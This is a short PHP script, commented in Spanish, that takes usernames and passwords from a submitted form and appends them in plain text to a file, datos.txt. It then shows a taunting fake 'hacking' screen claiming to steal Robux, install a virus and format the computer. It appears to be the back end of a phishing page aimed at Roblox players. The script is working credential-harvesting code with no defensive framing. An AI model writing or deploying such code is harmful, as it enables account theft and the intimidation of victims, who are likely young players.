<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $password = $_POST['password'];

    // Guardar datos en archivo
    $archivo = fopen("datos.txt", "a");
    fwrite($archivo, "Usuario: " . $usuario . "\n");
    fwrite($archivo, "Contraseña: " . $password . "\n");
    fwrite($archivo, "-----------------------------\n");
    fclose($archivo);

    // Ahora mostramos una pantalla de "Hackeo falso"
    echo '<!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Hackeando...</title>
        <style>
            body {
                background-color: black;
                color: lime;
                font-family: monospace;
                text-align: center;
                padding-top: 100px;
            }
            h1 {
                font-size: 50px;
            }
            p {
                font-size: 25px;
            }
        </style>
    </head>
    <body>
        <h1>¡¡¡HACKEANDO TU CUENTA!!!</h1>
        <p>Robando Robux...</p>
        <p>Instalando virus...</p>
        <p>Formateando computadora...</p>
        <p>¡MUHAHAHAHA!</p>
    </body>
    </html>';
}
?>
